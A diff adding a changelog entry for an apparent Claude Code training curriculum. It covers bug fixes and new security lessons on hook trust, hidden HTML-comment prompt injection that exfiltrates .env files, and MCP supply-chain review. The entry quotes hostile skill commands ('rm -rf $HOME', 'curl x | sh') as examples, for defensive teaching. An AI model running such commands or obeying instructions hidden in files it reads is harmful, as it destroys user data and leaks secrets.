@@ -1,5 +1,29 @@
 # Changelog
 
+## v2.24.0 (2026-04-18)
+
+**Senior-eval-driven fixes — real bugs, security content, Module 2 polish.** One merged PR with 12 commits closing every still-open item from Morgan's senior-persona evaluation (8 years professional experience). All 8 verification checks confirmed open before editing; A3 in particular surfaced a genuine documentation bug.
+
+### Real bugs
+- `CLAUDE.md` staleness check now detects the default remote branch via `git symbolic-ref refs/remotes/origin/HEAD` instead of hardcoding `origin/master`. Previously silently failed on any repo whose default branch is `main`.
+- `CLAUDE.md` Module Boundary Assessment now documents the 1-5 scale `moduleAverageQuality` uses, with per-category scores and a pointer to `observe-interaction.js`. Thresholds (3.8, 2.0) are now evaluable by tuners and reviewers.
+- **Memory hierarchy corrected in all 5 projects' Module 3.** Verification against `code.claude.com/docs/en/memory` revealed the curriculum placed `CLAUDE.local.md` at the BOTTOM of the hierarchy, contradicting Anthropic's own docs ("Within each directory, CLAUDE.local.md is appended after CLAUDE.md, so when instructions conflict, your personal notes are the last thing Claude reads at that level"). Corrected to place CLAUDE.local.md above project CLAUDE.md, with a softened "precedence" framing that matches the docs' concatenate-and-last-wins model.
+- Replaced `! git add -A` with `! git status` + `! git add <explicit paths>` in Module 2 across all 5 projects. Added a "Heads up" caution block explaining the `.env` / IDE config / build artifact risk. Three additional `git add -A` instances in Module 1 (canvas/forge) and Module 3 (byop) caught in follow-up.
+- Added `jq` to Module 1 as "Shell tools you'll need later" with install commands for macOS / Ubuntu / Windows Git Bash. Inline cross-reference at first jq usage in canvas/forge/nexus/byop Module 5 §5.6.
+
+### Security content (Morgan's strongest signal)
+- **New `### 5.1b Hook Trust Model` section** in all 5 projects. Explains what hooks can do (read creds, SSH keys, env vars), trust-model parity with `npm install`, the HTTP hook as an exfiltration primitive, a concrete malicious Stop hook JSON example, and a mitigation checklist (PR review, sandbox mode, read-before-approve).
+- **Elevated `disableSkillShellExecution` framing** from one sentence to a multi-paragraph threat treatment. Concrete hostile SKILL.md examples (`! rm -rf $HOME`, `! curl x | sh`), reframed as a trust boundary, default-on recommendation for unaudited repos, cross-reference to the Hook Trust Model.
+- **HTML-comment injection caveat** added to Module 3.7 across all 5 projects. Explains asymmetric visibility (auto-load strips, Read reveals), concrete `.env` exfiltration attack scenario, PR-review mitigation.
+- **`.mcp.json` supply-chain caveat** in Module 6 across all 5 projects. A PR that adds a new MCP server is a supply-chain event; review with the same bar as CI config or GitHub Actions workflows.
+
+### Module 2 polish
+- Port 4001 conflict warning in nexus §2.9 (echo server manual testing).
+- One-line PR/fast-forward caveat at end of §2.10 across all 5 projects: real teams open a PR here; we're fast-forwarding for solo learning. Forward reference to Module 10.
+
+### Explicitly deferred (per Morgan)
+- Failure-modes appendix per module; dependency DAG diagram; asymmetric struggle/engagement thresholds (research task); cost model; Senior+ Engineering value box retrofit; "Skip to Peer" override (partially mitigated by `/experience` skill already shipped).
+
 ## v2.23.0 (2026-04-17)
 
 **Adaptive system closure + student-visible progress + /stuck + /experience.** Four merged PRs since v2.22.0, 27 new tests, 609 total passing.
